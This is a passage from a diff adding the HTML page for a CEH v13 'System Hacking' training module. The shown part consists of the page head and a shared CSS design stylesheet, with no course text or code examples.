@@ -1,0 +1,3027 @@
+<!DOCTYPE html>
+<html lang="en" data-module="system-hacking" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CEH v13 Module 6: System Hacking</title>
+<meta name="description" content="The post-reconnaissance phase: password attacks, privilege escalation, maintaining access, and covering tracks — with the detection and hardening that counter each.">
+<style>
+/* ============================================================
+   CEH v13 COURSE CHASSIS  v1.0
+   Shared design tokens + components for every module.
+   Edit here, regenerate all modules. Do not edit per-module.
+   ============================================================ */
+
+/* ---------- 1. TOKENS : DARK (default) ---------- */
+:root {
+  /* Brand: terminal green, used as ACCENT not body text */
+  --accent:          #35e05f;
+  --accent-strong:   #6dff96;
+  --accent-dim:      rgba(53, 224, 95, 0.14);
+  --accent-line:     rgba(53, 224, 95, 0.34);
+
+  --cyan:            #43d9d4;
+  --amber:           #f0b429;
+  --danger:          #ff6b6b;
+  --success:         #35e05f;
+
+  /* Surfaces */
+  --bg:              #07090b;
+  --bg-elev:         #0e1216;
+  --surface:         #141a20;
+  --surface-2:       #1b232b;
+  --border:          #26313b;
+  --border-strong:   #37444f;
+
+  /* Text — high legibility, green reserved for accents */
+  --text:            #e8eef2;
+  --text-muted:      #9fb0bd;
+  --text-faint:      #6f8291;
+  --text-on-accent:  #04120a;
+
+  /* Code */
+  --code-bg:         #05070a;
+  --code-text:       #8ef0a8;
+  --code-border:     #1e2a33;
+
+  /* Typography */
+  --font-scale:      1;
+  --font-body:       system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  --font-mono:       ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+
+  --fs-base:  calc(1rem     * var(--font-scale));
+  --fs-sm:    calc(0.875rem * var(--font-scale));
+  --fs-xs:    calc(0.78rem  * var(--font-scale));
+  --fs-lg:    calc(1.125rem * var(--font-scale));
+  --fs-h1:    calc(clamp(1.6rem, 1.1rem + 2.2vw, 2.6rem) * var(--font-scale));
+  --fs-h2:    calc(clamp(1.35rem, 1rem + 1.4vw, 1.9rem) * var(--font-scale));
+  --fs-h3:    calc(clamp(1.1rem, 0.95rem + 0.6vw, 1.3rem) * var(--font-scale));
+  --fs-h4:    calc(1.02rem * var(--font-scale));
+
+  /* Space + shape */
+  --sp-1: 0.35rem; --sp-2: 0.6rem;  --sp-3: 0.9rem;
+  --sp-4: 1.3rem;  --sp-5: 1.9rem;  --sp-6: 2.6rem;
+  --radius:    10px;
+  --radius-lg: 16px;
+  --shadow:    0 2px 10px rgba(0,0,0,.42);
+  --shadow-lg: 0 10px 34px rgba(0,0,0,.5);
+  --ring:      0 0 0 3px rgba(53,224,95,.42);
+  --maxw:      1180px;
+}
+
+/* ---------- 2. TOKENS : LIGHT ---------- */
+[data-theme="light"] {
+  --accent:          #0f7a34;
+  --accent-strong:   #0a5c26;
+  --accent-dim:      rgba(15, 122, 52, 0.10);
+  --accent-line:     rgba(15, 122, 52, 0.30);
+
+  --cyan:            #0b6d78;
+  --amber:           #8a5a00;
+  --danger:          #b3261e;
+  --success:         #0f7a34;
+
+  --bg:              #f4f6f8;
+  --bg-elev:         #ffffff;
+  --surface:         #ffffff;
+  --surface-2:       #eef2f5;
+  --border:          #d3dbe2;
+  --border-strong:   #b4c0ca;
+
+  --text:            #10181f;
+  --text-muted:      #48586a;
+  --text-faint:      #6b7c8c;
+  --text-on-accent:  #ffffff;
+
+  --code-bg:         #10181f;
+  --code-text:       #a6f0be;
+  --code-border:     #26313b;
+
+  --shadow:    0 1px 3px rgba(16,24,31,.10);
+  --shadow-lg: 0 10px 30px rgba(16,24,31,.14);
+  --ring:      0 0 0 3px rgba(15,122,52,.34);
+}
+
+/* ---------- 2b. LEGACY ALIASES ----------
+   Pre-chassis modules referenced these names in inline styles and in JS
+   template literals. They are mapped onto the token system so inherited
+   markup stays theme-aware. Do not use them in new content. */
+:root, [data-theme="light"] {
+  --primary-color:   var(--accent);
+  --secondary-color: var(--cyan);
+  --accent-color:    var(--accent);
+  --success-color:   var(--success);
+  --warning-color:   var(--amber);
+  --danger-color:    var(--danger);
+  --error-color:     var(--danger);
+  --text-light:      var(--text-muted);
+  --text-dark:       var(--text);
+  --border-color:    var(--border);
+  --dark-bg:         var(--bg);
+  --card-bg:         var(--surface);
+  --light-bg:        var(--surface-2);
+
+  /* module-scoped legacy names */
+  --sniff-primary:   var(--accent);
+  --sniff-secondary: var(--cyan);
+}
+
+/* ---------- 3. RESET + BASE ---------- */
+*, *::before, *::after { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; scroll-behavior: smooth; }
+
+body {
+  margin: 0;
+  font-family: var(--font-body);
+  font-size: var(--fs-base);
+  line-height: 1.65;
+  color: var(--text);
+  background: var(--bg);
+  overflow-x: hidden;
+}
+
+h1, h2, h3, h4 { line-height: 1.25; margin: 0 0 var(--sp-3); font-weight: 700; }
+h1 { font-size: var(--fs-h1); }
+h2 { font-size: var(--fs-h2); }
+h3 { font-size: var(--fs-h3); color: var(--accent); }
+h4 { font-size: var(--fs-h4); color: var(--accent); }
+p  { margin: 0 0 var(--sp-3); }
+ul, ol { margin: 0 0 var(--sp-3); padding-left: 1.35rem; }
+li { margin-bottom: var(--sp-1); }
+strong { color: var(--text); font-weight: 700; }
+a { color: var(--accent); text-underline-offset: 3px; }
+a:hover { color: var(--accent-strong); }
+
+:focus-visible {
+  outline: 2px solid var(--accent);
+  outline-offset: 2px;
+  box-shadow: var(--ring);
+  border-radius: 4px;
+}
+
+.skip-link {
+  position: absolute; left: -9999px; top: 0; z-index: 999;
+  background: var(--accent); color: var(--text-on-accent);
+  padding: var(--sp-2) var(--sp-4); border-radius: 0 0 var(--radius) 0;
+  font-weight: 700; text-decoration: none;
+}
+.skip-link:focus { left: 0; }
+
+.visually-hidden {
+  position: absolute !important; width: 1px; height: 1px;
+  padding: 0; margin: -1px; overflow: hidden;
+  clip: rect(0 0 0 0); white-space: nowrap; border: 0;
+}
+
+/* ---------- 4. AMBIENT BACKDROP ---------- */
+.matrix-bg {
+  position: fixed; inset: 0; z-index: -1; pointer-events: none;
+  background:
+    radial-gradient(circle at 18% 24%, var(--accent-dim) 0%, transparent 42%),
+    radial-gradient(circle at 82% 72%, var(--accent-dim) 0%, transparent 46%);
+  opacity: .85;
+}
+[data-theme="light"] .matrix-bg { opacity: .5; }
+
+.matrix-line {
+  position: absolute; color: var(--accent); font-family: var(--font-mono);
+  font-size: 12px; opacity: .18; animation: matrix-fall 9s linear infinite;
+}
+@keyframes matrix-fall {
+  from { transform: translateY(-110vh); }
+  to   { transform: translateY(110vh); }
+}
+
+/* ---------- 5. LAYOUT ---------- */
+.container { max-width: var(--maxw); margin: 0 auto; padding: var(--sp-4); }
+
+/* ---------- 6. CONTROL BAR ---------- */
+.controlbar {
+  position: sticky; top: 0; z-index: 60;
+  display: flex; flex-wrap: wrap; align-items: center; gap: var(--sp-2);
+  padding: var(--sp-2) var(--sp-3);
+  background: color-mix(in srgb, var(--bg-elev) 92%, transparent);
+  border-bottom: 1px solid var(--border);
+  backdrop-filter: blur(10px);
+}
+.controlbar__brand {
+  font-family: var(--font-mono); font-size: var(--fs-xs);
+  color: var(--accent); letter-spacing: .09em; text-transform: uppercase;
+  font-weight: 700; margin-right: auto; white-space: nowrap;
+}
+.controlbar__group {
+  display: flex; align-items: center; gap: 4px;
+  border: 1px solid var(--border); border-radius: 999px;
+  padding: 3px; background: var(--surface);
+}
+.controlbar__label {
+  font-size: var(--fs-xs); color: var(--text-muted);
+  padding: 0 var(--sp-1); white-space: nowrap;
+}
+
+.ctl {
+  min-height: 38px; min-width: 38px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  padding: 0 var(--sp-2);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-muted); background: transparent;
+  border: 0; border-radius: 999px; cursor: pointer;
+  transition: background .15s, color .15s;
+}
+.ctl:hover  { background: var(--surface-2); color: var(--text); }
+.ctl[aria-pressed="true"], .ctl.is-active {
+  background: var(--accent); color: var(--text-on-accent);
+}
+.ctl:disabled { opacity: .4; cursor: not-allowed; }
+
+/* ---------- 7. HEADER ---------- */
+.header {
+  text-align: center; margin: var(--sp-5) 0 var(--sp-4);
+  padding: var(--sp-5) var(--sp-4);
+  background: var(--bg-elev);
+  border: 1px solid var(--border);
+  border-top: 3px solid var(--accent);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow);
+}
+.header h1 { color: var(--text); margin-bottom: var(--sp-3); }
+.module-info { color: var(--text-muted); max-width: 70ch; margin: 0 auto; }
+.module-info h3 { color: var(--accent); }
+
+.highlight {
+  display: inline-block;
+  background: var(--accent-dim); color: var(--accent);
+  border: 1px solid var(--accent-line);
+  padding: 2px 10px; margin: 3px; border-radius: 999px;
+  font-size: var(--fs-xs); font-weight: 600; white-space: nowrap;
+}
+
+/* ---------- 8. NAV (tablist) ---------- */
+.navigation {
+  display: flex; flex-wrap: wrap; gap: var(--sp-2);
+  margin-bottom: var(--sp-4);
+  padding: var(--sp-2);
+  background: var(--bg-elev);
+  border: 1px solid var(--border); border-radius: var(--radius-lg);
+}
+.nav-btn {
+  flex: 1 1 auto; min-height: 44px;
+  padding: var(--sp-2) var(--sp-3);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-muted); background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer; white-space: nowrap;
+  transition: background .15s, color .15s, border-color .15s;
+}
+.nav-btn:hover { color: var(--text); border-color: var(--border-strong); }
+.nav-btn[aria-selected="true"], .nav-btn.active {
+  background: var(--accent); color: var(--text-on-accent);
+  border-color: var(--accent);
+}
+.nav-btn__done { color: var(--accent); font-weight: 700; }
+.nav-btn[aria-selected="true"] .nav-btn__done { color: var(--text-on-accent); }
+
+/* ---------- 9. PROGRESS ---------- */
+.progress-wrap {
+  display: flex; align-items: center; gap: var(--sp-3);
+  margin-bottom: var(--sp-4);
+}
+.progress-bar {
+  flex: 1; height: 8px; overflow: hidden;
+  background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: 999px;
+}
+.progress-fill {
+  height: 100%; width: 0;
+  background: linear-gradient(90deg, var(--accent), var(--cyan));
+  border-radius: 999px; transition: width .35s ease;
+}
+.progress-text {
+  font-family: var(--font-mono); font-size: var(--fs-xs);
+  color: var(--text-muted); white-space: nowrap;
+}
+
+/* ---------- 10. SECTIONS ---------- */
+.module-section { display: none; animation: fade-in .28s ease; }
+.module-section.active { display: block; }
+@keyframes fade-in { from { opacity: 0; transform: translateY(8px);} to {opacity:1;transform:none;} }
+
+.section-title {
+  color: var(--text);
+  padding-bottom: var(--sp-2); margin-bottom: var(--sp-4);
+  border-bottom: 2px solid var(--accent-line);
+}
+.subsection {
+  margin: var(--sp-4) 0; padding-left: var(--sp-3);
+  border-left: 3px solid var(--accent-line);
+}
+
+/* ---------- 11. CARDS ---------- */
+.card, .feature-card, .tool-card, .tool-showcase, .interactive-demo, .lab-simulator {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: var(--sp-4);
+  margin-bottom: var(--sp-4);
+  box-shadow: var(--shadow);
+}
+.feature-card, .tool-card { margin-bottom: 0; height: 100%; }
+.interactive-demo, .lab-simulator { border-left: 3px solid var(--accent); }
+
+.grid-2, .grid-3 { display: grid; gap: var(--sp-4); margin-bottom: var(--sp-4); }
+.grid-2 { grid-template-columns: repeat(auto-fit, minmax(min(100%, 300px), 1fr)); }
+.grid-3 { grid-template-columns: repeat(auto-fit, minmax(min(100%, 250px), 1fr)); }
+
+/* ---------- 12. CODE + TERMINAL ---------- */
+.code-block, .terminal, .demo-output {
+  font-family: var(--font-mono);
+  font-size: var(--fs-sm);
+  line-height: 1.6;
+  background: var(--code-bg);
+  color: var(--code-text);
+  border: 1px solid var(--code-border);
+  border-radius: var(--radius);
+  padding: var(--sp-3);
+  margin: var(--sp-3) 0;
+  overflow-x: auto;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.demo-output { min-height: 60px; color: var(--text); }
+.demo-output:empty::before {
+  content: "Output appears here after you run the demo.";
+  color: var(--text-faint); font-style: italic;
+}
+.demo-controls { display: flex; flex-wrap: wrap; gap: var(--sp-2); margin: var(--sp-3) 0; }
+
+/* ---------- 13. BUTTONS ---------- */
+.btn {
+  min-height: 44px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  padding: var(--sp-2) var(--sp-4);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-on-accent); background: var(--accent);
+  border: 1px solid var(--accent); border-radius: var(--radius);
+  cursor: pointer; text-decoration: none;
+  transition: filter .15s, transform .08s;
+}
+.btn:hover { filter: brightness(1.12); }
+.btn:active { transform: translateY(1px); }
+.btn-success { background: var(--success); border-color: var(--success); }
+.btn-warning { background: var(--amber);  border-color: var(--amber);  color: var(--text-on-accent); }
+.btn-danger  { background: var(--danger); border-color: var(--danger); color: #fff; }
+[data-theme="light"] .btn-warning { color: #fff; }
+
+/* ---------- 14. FLOW DIAGRAM ---------- */
+.attack-flow {
+  display: flex; flex-wrap: wrap; align-items: center; gap: var(--sp-2);
+  margin: var(--sp-4) 0;
+}
+.flow-step {
+  flex: 1 1 150px; min-width: 130px; text-align: center;
+  padding: var(--sp-3);
+  font-size: var(--fs-sm); font-weight: 600;
+  background: var(--accent-dim); color: var(--text);
+  border: 1px solid var(--accent-line); border-radius: var(--radius);
+}
+.flow-arrow { color: var(--accent); font-size: var(--fs-lg); font-weight: 700; }
+
+/* ---------- 15. QUIZ ---------- */
+.quiz-container { background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); padding: var(--sp-4); }
+.quiz-question { margin-bottom: var(--sp-4); }
+.quiz-options { display: grid; gap: var(--sp-2); margin: var(--sp-3) 0; list-style: none; padding: 0; }
+.quiz-option {
+  width: 100%; min-height: 44px; text-align: left;
+  padding: var(--sp-3);
+  font: inherit; font-size: var(--fs-base); color: var(--text);
+  background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer; transition: border-color .15s, background .15s;
+}
+.quiz-option:hover { border-color: var(--accent); }
+.quiz-option.selected { border-color: var(--accent); background: var(--accent-dim); }
+.quiz-option.correct::after   { content: "  ✓ Correct"; color: var(--success); font-weight: 700; }
+.quiz-option.incorrect::after { content: "  ✕ Incorrect"; color: var(--danger); font-weight: 700; }
+.quiz-option.correct   { border-color: var(--success); background: color-mix(in srgb, var(--success) 14%, transparent); }
+.quiz-option.incorrect { border-color: var(--danger);  background: color-mix(in srgb, var(--danger) 14%, transparent); }
+.quiz-navigation { display: flex; flex-wrap: wrap; gap: var(--sp-2); justify-content: space-between; margin-top: var(--sp-4); }
+
+/* ---------- 16. RESOURCES ---------- */
+.resource-link {
+  display: inline-block; margin: 3px 0;
+  color: var(--accent); text-decoration: none; font-weight: 500;
+}
+.resource-link:hover { text-decoration: underline; }
+.resource-link[target="_blank"]::after { content: " ↗"; font-size: .85em; color: var(--text-faint); }
+
+/* ---------- 17. MODAL ---------- */
+.modal {
+  display: none; position: fixed; inset: 0; z-index: 100;
+  background: rgba(0,0,0,.72);
+  padding: var(--sp-4);
+  overflow-y: auto;
+}
+.modal.open { display: flex; align-items: flex-start; justify-content: center; }
+.modal-content {
+  position: relative;
+  width: 100%; max-width: 760px; margin: auto;
+  background: var(--bg-elev); color: var(--text);
+  border: 1px solid var(--border-strong); border-radius: var(--radius-lg);
+  padding: var(--sp-5); box-shadow: var(--shadow-lg);
+}
+.close {
+  position: absolute; top: var(--sp-2); right: var(--sp-2);
+  min-width: 44px; min-height: 44px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.6rem; line-height: 1;
+  color: var(--text-muted); background: transparent;
+  border: 0; border-radius: var(--radius); cursor: pointer;
+}
+.close:hover { color: var(--danger); background: var(--surface-2); }
+
+/* ---------- 18. NOTIFICATION ---------- */
+.notification {
+  position: fixed; right: var(--sp-4); bottom: var(--sp-4); z-index: 120;
+  max-width: min(92vw, 360px);
+  padding: var(--sp-3) var(--sp-4);
+  font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-on-accent); background: var(--accent);
+  border-radius: var(--radius); box-shadow: var(--shadow-lg);
+  opacity: 0; transform: translateY(14px); pointer-events: none;
+  transition: opacity .25s, transform .25s;
+}
+.notification.show { opacity: 1; transform: none; }
+.notification.error   { background: var(--danger); color: #fff; }
+.notification.warning { background: var(--amber); }
+
+/* ---------- 18a. GLOSSARY TOOLTIPS ---------- */
+.term {
+  border-bottom: 1px dotted var(--accent);
+  cursor: help;
+  color: inherit;
+  transition: background-color .12s ease, color .12s ease;
+  border-radius: 2px;
+}
+.term:hover,
+.term:focus-visible {
+  background: var(--accent-dim);
+  color: var(--accent);
+  outline: none;
+}
+.term:focus-visible { box-shadow: 0 0 0 2px var(--ring); }
+
+.tooltip-bubble {
+  position: absolute;
+  z-index: 1200;
+  max-width: min(320px, 86vw);
+  padding: var(--sp-2) var(--sp-3);
+  background: var(--surface);
+  color: var(--text);
+  border: 1px solid var(--border-strong);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow-lg);
+  font-size: var(--fs-sm);
+  line-height: 1.5;
+  opacity: 0;
+  transform: translateY(2px);
+  transition: opacity .14s ease, transform .14s ease;
+  pointer-events: none;
+}
+.tooltip-bubble.is-visible { opacity: 1; transform: none; }
+.tooltip-bubble::after {
+  content: "";
+  position: absolute;
+  left: var(--tip-arrow, 50%);
+  width: 9px; height: 9px;
+  background: var(--surface);
+  border: 1px solid var(--border-strong);
+  transform: translateX(-50%) rotate(45deg);
+}
+.tooltip-bubble[data-placement="top"]::after {
+  bottom: -5px; border-top: none; border-left: none;
+}
+.tooltip-bubble[data-placement="bottom"]::after {
+  top: -5px; border-bottom: none; border-right: none;
+}
+
+/* cross-module reference links */
+a.xref {
+  color: var(--accent);
+  text-decoration: none;
+  border-bottom: 1px solid var(--accent-line);
+  white-space: nowrap;
+}
+a.xref:hover, a.xref:focus-visible { border-bottom-color: var(--accent); background: var(--accent-dim); border-radius: 2px; }
+
+/* ---------- 18b. COURSE NAV ---------- */
+.course-nav {
+  display: flex; flex-wrap: wrap; gap: var(--sp-2);
+  align-items: center; justify-content: space-between;
+  margin-top: var(--sp-5); padding-top: var(--sp-4);
+  border-top: 1px solid var(--border);
+}
+.course-nav a {
+  min-height: 44px;
+  display: inline-flex; align-items: center; gap: 8px;
+  padding: var(--sp-2) var(--sp-4);
+  font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text); background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  text-decoration: none;
+}
+.course-nav a:hover { border-color: var(--accent); color: var(--accent); }
+.course-nav .is-home { margin-inline-start: auto; }
+.course-nav .is-aux {
+  font-weight: 500; color: var(--text-muted);
+  background: transparent; border-color: var(--border);
+}
+.course-nav .is-aux:last-of-type { margin-inline-end: auto; }
+.course-nav .is-aux:hover { color: var(--accent); border-color: var(--accent); }
+.course-nav .is-disabled { opacity: .4; pointer-events: none; }
+
+/* ---------- 18c. LEGACY COMPONENTS ----------
+   Class names inherited from the pre-chassis modules. The old per-module
+   stylesheets are gone, so these are mapped onto the token system here.
+   New content should use .card / .grid-2 / .grid-3 / .terminal instead. */
+
+/* card family */
+.ai-tool-card, .analysis-card, .assessment-card, .attack-card, .aws-card,
+.azure-card, .cia-element, .cloud-card, .database-card, .enum-card,
+.gcp-card, .hacker-card, .kill-chain-step, .lab-card, .lab-exercise,
+.lab-scenario, .legal-card, .malware-card, .mitre-tactic, .objective-card,
+.resource-card, .technique-card, .timeline-item, .vulnerability-card,
+.webapp-card, .certification-preview, .lab-environment,
+.static-analysis, .dynamic-analysis {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: var(--sp-4);
+  margin-bottom: var(--sp-3);
+}
+.kill-chain-step, .mitre-tactic, .timeline-item { border-left: 3px solid var(--accent); }
+.lab-exercise, .lab-scenario, .lab-card { border-left: 3px solid var(--cyan); }
+
+/* attacker-hat cards keep a semantic edge colour */
+.white-hat { border-left: 4px solid var(--success); }
+.gray-hat  { border-left: 4px solid var(--amber); }
+.black-hat { border-left: 4px solid var(--danger); }
+
+/* grid family */
+.ai-tools-grid, .assessment-grid, .attack-grid, .cia-triad, .cloud-providers,
+.database-services, .enum-types, .hacker-types, .kill-chain, .labs-container,
+.legal-framework, .malware-grid, .mitre-matrix, .resources-grid,
+.stats-container, .technique-grid, .tool-grid, .tool-mastery-grid,
+.tools-grid, .vulnerability-grid, .webapp-techniques, .timeline,
+.analysis-comparison, .completion-stats {
+  display: grid;
+  gap: var(--sp-3);
+  grid-template-columns: repeat(auto-fit, minmax(min(100%, 260px), 1fr));
+  margin-bottom: var(--sp-4);
+}
+.timeline, .lab-container { grid-template-columns: 1fr; }
+
+.lab-header {
+  display: flex; flex-wrap: wrap; align-items: center; gap: var(--sp-2);
+  justify-content: space-between; margin-bottom: var(--sp-3);
+}
+.lab-objectives, .lab-steps, .step-list { margin: var(--sp-2) 0 var(--sp-3) 1.2rem; }
+
+/* terminal output lines */
+.terminal-line { display: block; font-family: var(--font-mono); font-size: var(--fs-sm); }
+.terminal-line.prompt,  .terminal-line .prompt  { color: var(--accent); }
+.terminal-line.output,  .terminal-line .output  { color: var(--text); }
+.terminal-line.info,    .terminal-line .info    { color: var(--cyan); }
+.terminal-line.success, .terminal-line .success { color: var(--success); }
+.terminal-line.warning, .terminal-line .warning { color: var(--amber); }
+.terminal-line.error,   .terminal-line .error   { color: var(--danger); }
+.azure-output, .gcp-output {
+  font-family: var(--font-mono); font-size: var(--fs-sm);
+  background: var(--code-bg); color: var(--code-text);
+  border: 1px solid var(--code-border); border-radius: var(--radius);
+  padding: var(--sp-3); margin: var(--sp-2) 0; overflow-x: auto; white-space: pre-wrap;
+}
+
+/* callout boxes */
+.info-box, .success-box, .warning-box {
+  padding: var(--sp-3) var(--sp-4); margin: var(--sp-3) 0;
+  border: 1px solid var(--border); border-left-width: 4px;
+  border-radius: var(--radius); background: var(--surface-2);
+}
+.info-box    { border-left-color: var(--cyan); }
+.success-box { border-left-color: var(--success); }
+.warning-box { border-left-color: var(--amber); }
+
+/* CVSS severity */
+.cvss-score {
+  display: inline-block; padding: 2px 12px; border-radius: 999px;
+  font-family: var(--font-mono); font-weight: 700; font-size: var(--fs-sm);
+  background: var(--surface-2); border: 1px solid var(--border);
+}
+.cvss-none     { color: var(--text-muted); }
+.cvss-low      { color: var(--success); border-color: var(--success); }
+.cvss-medium   { color: var(--amber);   border-color: var(--amber); }
+.cvss-high     { color: var(--danger);  border-color: var(--danger); }
+.cvss-critical { color: var(--text-on-accent); background: var(--danger); border-color: var(--danger); }
+
+/* quiz-option aliases used by some modules */
+.option {
+  display: block; width: 100%; text-align: left; min-height: 44px;
+  padding: var(--sp-3); margin-bottom: var(--sp-2);
+  font: inherit; color: var(--text);
+  background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer;
+}
+.option:hover { border-color: var(--accent); }
+.option.selected { border-color: var(--accent); background: var(--accent-dim); }
+.option.correct   { border-color: var(--success); background: color-mix(in srgb, var(--success) 14%, transparent); }
+.option.incorrect { border-color: var(--danger);  background: color-mix(in srgb, var(--danger) 14%, transparent); }
+.options { list-style: none; padding: 0; margin: var(--sp-3) 0; }
+.question { margin-bottom: var(--sp-4); }
+
+/* misc */
+.btn-secondary { background: var(--surface-2); color: var(--text); border-color: var(--border-strong); }
+.btn-lab, .lab-btn {
+  min-height: 44px; display: inline-flex; align-items: center; gap: 6px;
+  padding: var(--sp-2) var(--sp-4); font: inherit; font-weight: 600;
+  color: var(--text-on-accent); background: var(--cyan);
+  border: 1px solid var(--cyan); border-radius: var(--radius); cursor: pointer;
+}
+.tool-icon, .enum-icon { font-size: calc(1.6rem * var(--font-scale)); line-height: 1; }
+.score-display {
+  font-family: var(--font-mono); font-size: calc(2.4rem * var(--font-scale));
+  font-weight: 700; color: var(--accent); text-align: center;
+}
+.stat-number {
+  font-family: var(--font-mono); font-size: calc(1.7rem * var(--font-scale));
+  font-weight: 700; color: var(--accent); line-height: 1.1;
+}
+.completion-badge, .certification-badge {
+  display: inline-block; padding: var(--sp-2) var(--sp-4);
+  font-weight: 700; color: var(--text-on-accent);
+  background: var(--accent); border-radius: 999px;
+}
+.certification-section { margin-top: var(--sp-5); }
+.stat-card {
+  text-align: center; padding: var(--sp-4);
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+}
+.module-section .footer, main .footer {
+  margin-top: var(--sp-5); padding-top: var(--sp-4);
+  border-top: 1px solid var(--border);
+  font-size: var(--fs-xs); color: var(--text-faint); text-align: center;
+}
+.pulse { animation: pulse 2s ease-in-out infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .55; } }
+
+/* ---------- 18d. NOTES ---------- */
+.notes-fab {
+  position: fixed; right: var(--sp-4); bottom: var(--sp-4); z-index: 90;
+  min-width: 56px; min-height: 56px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  padding: 0 var(--sp-4);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-on-accent); background: var(--accent);
+  border: none; border-radius: 999px; cursor: pointer;
+  box-shadow: var(--shadow-lg);
+  transition: filter .15s, transform .1s;
+}
+.notes-fab:hover { filter: brightness(1.1); }
+.notes-fab:active { transform: translateY(1px); }
+.notes-fab__icon { font-size: 1.3rem; line-height: 1; }
+.notes-fab__dot {
+  position: absolute; top: 6px; right: 8px;
+  width: 11px; height: 11px; border-radius: 50%;
+  background: var(--amber); border: 2px solid var(--bg);
+}
+
+.notes-panel {
+  position: fixed; right: var(--sp-4); bottom: calc(var(--sp-4) + 68px);
+  z-index: 95;
+  width: min(94vw, 420px); max-height: min(72vh, 560px);
+  display: none; flex-direction: column;
+  background: var(--bg-elev);
+  border: 1px solid var(--border-strong); border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-lg);
+  overflow: hidden;
+}
+.notes-panel.open { display: flex; animation: fade-in .2s ease; }
+
+.notes-panel__head {
+  display: flex; align-items: center; gap: var(--sp-2);
+  padding: var(--sp-3);
+  border-bottom: 1px solid var(--border);
+}
+.notes-panel__title { font-weight: 700; font-size: var(--fs-base); margin-right: auto; }
+.notes-panel__close {
+  min-width: 36px; min-height: 36px; display: flex; align-items: center; justify-content: center;
+  font-size: 1.4rem; line-height: 1; color: var(--text-muted);
+  background: transparent; border: 0; border-radius: var(--radius); cursor: pointer;
+}
+.notes-panel__close:hover { color: var(--danger); background: var(--surface-2); }
+
+.notes-tabs { display: flex; gap: 4px; padding: var(--sp-2) var(--sp-3) 0; }
+.notes-tab {
+  flex: 1; min-height: 38px; padding: var(--sp-1) var(--sp-2);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-muted); background: var(--surface);
+  border: 1px solid var(--border); border-bottom: none;
+  border-radius: var(--radius) var(--radius) 0 0; cursor: pointer;
+}
+.notes-tab[aria-pressed="true"] { color: var(--accent); background: var(--surface-2); border-color: var(--border-strong); }
+
+.notes-panel__scope {
+  font-size: var(--fs-xs); color: var(--text-faint);
+  padding: var(--sp-2) var(--sp-3) 0;
+}
+.notes-panel__body { padding: var(--sp-2) var(--sp-3); flex: 1; min-height: 0; display: flex; }
+.notes-area {
+  width: 100%; min-height: 180px; resize: vertical;
+  padding: var(--sp-3);
+  font: inherit; font-size: var(--fs-base); line-height: 1.55;
+  color: var(--text); background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius);
+}
+.notes-area:focus-visible { border-color: var(--accent); }
+
+.notes-panel__foot {
+  display: flex; gap: var(--sp-2); align-items: center;
+  padding: var(--sp-2) var(--sp-3) var(--sp-3);
+}
+.notes-panel__foot .notes-hint { font-size: var(--fs-xs); color: var(--text-faint); margin-right: auto; }
+.notes-mini {
+  min-height: 36px; padding: 0 var(--sp-3);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text); background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: var(--radius); cursor: pointer;
+}
+.notes-mini:hover { border-color: var(--accent); color: var(--accent); }
+.notes-mini.is-danger:hover { border-color: var(--danger); color: var(--danger); }
+
+@media (max-width: 720px) {
+  .notes-panel { right: 3vw; left: 3vw; width: auto; bottom: calc(var(--sp-3) + 64px); }
+  .notes-fab { right: var(--sp-3); bottom: var(--sp-3); }
+  .notes-fab__text { display: none; }
+}
+
+/* ---------- 19. FOOTER ---------- */
+.module-footer {
+  margin-top: var(--sp-6); padding: var(--sp-4) 0;
+  border-top: 1px solid var(--border);
+  font-size: var(--fs-xs); color: var(--text-faint); text-align: center;
+}
+.module-footer .legal {
+  max-width: 70ch; margin: 0 auto var(--sp-2);
+}
+
+/* ---------- 20. MOTION ---------- */
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .001ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: .001ms !important;
+    scroll-behavior: auto !important;
+  }
+  .matrix-line { display: none; }
+}
+
+/* ---------- 21. RESPONSIVE ---------- */
+@media (max-width: 720px) {
+  .container { padding: var(--sp-3); }
+  .header { padding: var(--sp-4) var(--sp-3); }
+  .nav-btn { flex: 1 1 100%; }
+  .controlbar__brand { flex: 1 1 100%; margin-bottom: 4px; }
+  .attack-flow { flex-direction: column; }
+  .flow-arrow { transform: rotate(90deg); }
+}
+
+/* ---------- 22. PRINT ---------- */
+@media print {
+  :root {
+    --bg: #fff; --bg-elev: #fff; --surface: #fff; --surface-2: #fff;
